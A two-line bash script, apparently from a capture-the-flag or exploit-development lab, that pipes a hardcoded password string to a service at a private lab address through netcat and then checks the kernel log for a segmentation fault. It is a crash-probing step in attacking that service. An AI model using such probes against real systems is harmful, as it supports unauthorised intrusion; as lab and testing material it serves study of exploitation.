#!/bin/bash

(echo R3sp3ctY04r4dm1niSt4t0rL1keYo4R3spectY04rG0d; sleep 1; echo 'dmesg|tail -1' ) | nc -n 192.168.56.101 54311 | grep segf
